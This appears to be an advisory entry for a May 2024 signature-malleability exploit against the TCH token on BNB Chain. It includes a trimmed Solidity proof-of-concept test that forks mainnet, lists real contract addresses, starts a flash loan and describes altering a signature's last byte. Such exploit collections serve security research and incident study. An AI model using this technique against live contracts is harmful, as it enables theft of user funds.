# [?] TCH - Signature Malleability Vulnerability

## Summary
Severity: Unknown
Chain: BNB Chain
Component: TCH
Published: 2024-05-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TCH_exp.sol
Type: defi-exploit-poc

## Details
Lost: $18K

```solidity
contract ContractTest is Test {
    // Struct representing params for burnToken() flawed function
    // tamperedSig -> Signature with last byte replaced from '0x1c' (28) to '0x01' (1) or '0x1b' (27) to '0x00' (0)
    struct BurnInfo {
        uint256 amount;
        uint256 nonce;
        bytes tamperedSig;
    }

    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Router_V2 private constant PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ITCH private constant TCH = ITCH(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address private constant busdt_tch = 0xb7F1FFf722e68A6Fc44980f5D48d6d3Dbc1fe9cF;

    uint256 private constant flashAmount = 2_500_000e18;
    uint256 private constant blocknumToForkFrom = 38_776_239;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(BUSDT_USDC), "BUSDT_USDC");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(TCH), "TCH");
        vm.label(address(BUSDT), "BUSDT");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        BUSDT_USDC.flash(address(this), flashAmount, 0, bytes(""));

        emit log_named_decimal_uint(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TCH_exp.sol_
